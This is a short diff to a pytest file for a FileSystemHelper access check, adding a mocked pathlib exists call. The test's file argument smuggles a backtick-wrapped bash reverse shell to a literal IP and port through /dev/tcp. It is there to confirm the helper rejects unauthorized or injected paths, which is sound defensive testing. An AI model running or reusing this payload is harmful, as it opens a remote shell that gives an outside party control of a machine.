@@ -14,6 +14,7 @@ Test Cases for FileSystemHelper
 """
 
 import os
+import pathlib
 from subprocess import CompletedProcess
 
 import pytest
@@ -141,6 +142,7 @@ def test_file_browser_check_access_invalid_path_unauthorized_access(
     try to read a file in restricted directories and unauthorized access exception should be thrown
     """
     monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)
+    monkeypatch.setattr(pathlib.Path, "exists", lambda *_: False)
     with pytest.raises(exceptions.SocaException) as exc_info:
         file_system_helper.check_access(
             file='/"`bash -i >& /dev/tcp/54.214.65.93/3377 0>&1`\\'
